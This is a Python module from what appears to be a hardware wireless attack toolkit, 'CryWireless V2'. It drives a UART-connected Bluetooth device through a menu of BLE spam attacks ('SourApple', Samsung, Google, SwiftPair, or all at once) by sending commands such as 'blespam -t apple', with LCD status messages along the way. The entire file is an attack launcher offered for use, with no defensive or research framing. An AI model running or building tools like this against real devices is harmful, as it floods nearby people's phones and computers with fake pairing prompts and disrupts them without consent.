# ble_module.py
import os
import sys
import time
import serial


parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

import banner
from debugs import debug

LCD_AVAILABLE = False
try:
    from core.LCD_Module import display_message, clear_display
    LCD_AVAILABLE = True
except ImportError:
    try:
        from LCD_Module import display_message, clear_display
        LCD_AVAILABLE = True
    except ImportError:
        display_message = lambda msg, row, duration=None: None
        clear_display = lambda: None

class BLEAttackModule:
    def __init__(self, ble_port="/dev/ttyUSB0"):
        self.ble_port = ble_port

    def uart_command(self, cmd):
        try:
            if LCD_AVAILABLE:
                clear_display()
                display_message("Connecting to", 0)
                display_message(f"{self.ble_port[:14]}", 1)
            
            s = serial.Serial(self.ble_port, 115200, timeout=1)
            debug("ok", f"Connected to {self.ble_port}")
            
            if LCD_AVAILABLE:
                display_message("  Connected!  ", 0)
                display_message(" Sending CMD  ", 1)
                time.sleep(1)
            
            s.write((cmd + "\r").encode())
            s.flush()
            debug("ok", f"Command sent: {cmd}")
            
            if LCD_AVAILABLE:
                clear_display()
                display_message(" BLE Attack  ", 0)
                display_message("   Running... ", 1)
            
            input("\nAttack Running... Press Enter to stop")
            
            if LCD_AVAILABLE:
                clear_display()
                display_message("   Stopping   ", 0)
                display_message("   Attack...  ", 1)
            
            s.write(b"stopscan\r")
            s.flush()
            time.sleep(0.5)
            s.close()
            debug("info", "Attack stopped... Cleaning up")
            
            if LCD_AVAILABLE:
                display_message("Attack Stopped", 0)
                display_message("   Complete!  ", 1)
                time.sleep(2)
            
        except serial.SerialException as e:
            debug("critical", f"Serial port error: {e}")
            debug("error", f"Make sure the device is connected to {self.ble_port}")
            if LCD_AVAILABLE:
                display_message(" Serial Error ", 0)
                display_message("Check Device", 1)
                time.sleep(2)
        except Exception as e:
            debug("critical", f"Fatal error: {e}")
            if LCD_AVAILABLE:
                display_message(" Fatal Error  ", 0)
                display_message(" Check Logs  ", 1)
                time.sleep(2)

    def display_menu(self):
        os.system("clear")
        banner.ble_menu()
        print(f"\nUsing port: {self.ble_port}")
        print("\nAvailable BLE Attacks:")
        print("1. SourApple Spam")
        print("2. Samsung BLE Spam")
        print("3. Google BLE Spam")
        print("4. SwiftPair BLE Spam")
        print("5. Attack All (Cycle through all)")
        print("0. Exit")
        print()

    def run(self):
        debug("info", "BLE Attack Module requires a UART-connected BLE device")
        port_input = input(f"Enter BLE device port (default: {self.ble_port}): ").strip()
        if port_input:
            self.ble_port = port_input
        
        while True:
            self.display_menu()
            attack = input("Select BLE attack: ").strip()
            
            if attack == "0":
                debug("info", "Exiting BLE module...")
                break
            elif attack == "1" or attack.lower() == "sourapple spam":
                debug("info", "Starting SourApple Spam attack...")
                self.uart_command("blespam -t apple")
            elif attack == "2" or attack.lower() == "samsung ble":
                debug("info", "Starting Samsung BLE Spam attack...")
                self.uart_command("blespam -t samsung")
            elif attack == "3" or attack.lower() == "google ble":
                debug("info", "Starting Google BLE Spam attack...")
                self.uart_command("blespam -t google")
            elif attack == "4" or attack.lower() == "swiftpair ble":
                debug("info", "Starting SwiftPair BLE Spam attack...")
                self.uart_command("blespam -t windows")
            elif attack == "5" or attack.lower() == "attack all":
                debug("info", "Starting All BLE Spam attacks...")
                self.uart_command("blespam -t all")
            else:
                debug("error", "Invalid choice. Please try again.")
                time.sleep(2)


if __name__ == "__main__":
    debug("info", "CryWireless V2 - BLE Attack Module - Standalone Test")
    ble = BLEAttackModule()
    ble.run()